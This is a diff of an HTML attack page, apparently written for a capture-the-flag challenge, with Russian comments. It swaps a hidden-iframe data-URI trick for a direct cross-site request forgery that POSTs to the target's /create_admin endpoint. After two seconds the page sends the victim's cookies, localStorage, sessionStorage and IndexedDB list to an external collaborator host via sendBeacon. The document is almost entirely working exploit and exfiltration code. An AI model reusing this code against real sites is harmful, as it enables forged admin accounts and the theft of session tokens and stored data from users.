@@ -1,24 +1,43 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="n" style="display:none"></iframe>
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20431';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// data: URI имеет origin null - может обходить CORS
-const dataUri = 'data:text/html,<!DOCTYPE html><html><body>' +
-  '<form id="f" action="' + TARGET + '/create_admin" method="POST">' +
-  '<input name="new_admin_login" value="NULL_ORIGIN_TEST">' +
-  '</form>' +
-  '<script>' +
-  'document.getElementById("f").submit();' +
-  'setTimeout(function() {' +
-  '  navigator.sendBeacon("' + COLLAB + '/null_origin", document.body.innerHTML);' +
-  '}, 2000);' +
-  '</script></body></html>';
+// Создаём админа
+const form = document.createElement('form');
+form.method = 'POST';
+form.action = TARGET + '/create_admin';
+form.target = '_blank';
+form.innerHTML = '<input name="new_admin_login" value="FLAG_CHECK">';
+document.body.appendChild(form);
+form.submit();
 
-document.getElementById('n').src = dataUri;
+// Через 2 секунды проверяем что сохранилось
+setTimeout(() => {
+    // Куки
+    navigator.sendBeacon(COLLAB + '/cookies', document.cookie);
+    
+    // LocalStorage
+    try {
+        const ls = JSON.stringify(localStorage);
+        navigator.sendBeacon(COLLAB + '/localstorage', ls);
+    } catch(e) {}
+    
+    // SessionStorage
+    try {
+        const ss = JSON.stringify(sessionStorage);
+        navigator.sendBeacon(COLLAB + '/sessionstorage', ss);
+    } catch(e) {}
+    
+    // IndexedDB
+    if ('indexedDB' in window) {
+        indexedDB.databases().then(dbs => {
+            navigator.sendBeacon(COLLAB + '/indexeddb', JSON.stringify(dbs));
+        });
+    }
+}, 2000);
 </script>
 </body>
 </html>
